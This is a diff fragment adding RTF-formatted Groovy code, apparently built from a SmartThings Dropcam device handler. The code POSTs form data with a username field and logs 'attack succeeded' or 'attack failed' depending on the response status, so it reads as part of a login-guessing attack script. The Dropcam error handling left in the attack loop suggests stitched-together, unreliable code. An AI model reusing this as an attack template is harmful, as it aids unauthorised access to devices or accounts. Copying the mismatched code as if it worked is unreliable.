+}            {\cf24 path:} {\cf2 ""}{\cf8 ,}\par
+            {\cf24 requestContentType:} {\cf2 "application/x-www-form-urlencoded"}{\cf8 ,}\par
+            {\cf24 body:} {\cf8 [}\par
+        		{\cf24 username:} codes\par
+    		{\cf8 ]}\par
+      {\cf8 ]}\par
+      {\cf10\b try} {\cf8 \{}\par
+		httpPost{\cf8 (}takeParams{\cf8 )} {\cf8 \{} resp {\cf8 -}{\cf8 >}\par
+			{\cf10\b if} {\cf8 (}resp{\cf8 .}{\cf21 status} {\cf8 =}{\cf8 =} {\cf8 200}{\cf8 )} {\cf8 \{}\par
+				log{\cf8 .}{\cf21 debug} {\cf2 "attack succeeded"}\par
+                log{\cf8 .}{\cf21 debug} resp{\cf8 .}{\cf21 data}{\cf8 .}{\cf21 toString}{\cf8 (}{\cf8 )}\par
+			{\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+				log{\cf8 .}{\cf21 error} {\cf2 "attack failed"}\par
+			{\cf8 \}}\par
+		{\cf8 \}}\par
+	 {\cf8 \}} {\cf10\b catch} {\cf8 (}groovyx{\cf8 .}{\cf21 net}{\cf8 .}{\cf21 http}{\cf8 .}{\cf21 HttpResponseException} e{\cf8 )} {\cf8 \{}\par
+		log{\cf8 .}{\cf21 error} {\cf2 "Dropcam get_image failure: $\{e\} with status: $\{e.statusCode\}"}\par
+		{\cf10\b if} {\cf8 (}e{\cf8 .}{\cf21 statusCode} {\cf8 =}{\cf8 =} {\cf8 403}{\cf8 )} {\cf8 \{}\par
+			{\cf10\b throw} {\cf10\b new} {\cf5 RuntimeException}{\cf8 (}{\cf2 "Login Required"}{\cf8 )}\par
+		{\cf8 \}} {\cf10\b else} {\cf10\b if} {\cf8 (}e{\cf8 .}{\cf21 statusCode} {\cf8 =}{\cf8 =} {\cf8 404}{\cf8 )} {\cf8 \{}\par
+			log{\cf8 .}{\cf21 error} {\cf2 "Dropcam 404, camera may be offline"}\par
+		{\cf8 \}}\par
+	 {\cf8 \}} {\cf10\b catch} {\cf8 (}Exception e{\cf8 )} {\cf8 \{}\par
+		log{\cf8 .}{\cf21 error} {\cf2 "Unexpected Dropcam exception"}{\cf8 ,} e\par
+		{\cf1\i //sendNotification("Your dropcam is offline.")\par
+}	 {\cf8 \}}\par
+   \par
+{\cf8 \}}\par
+}
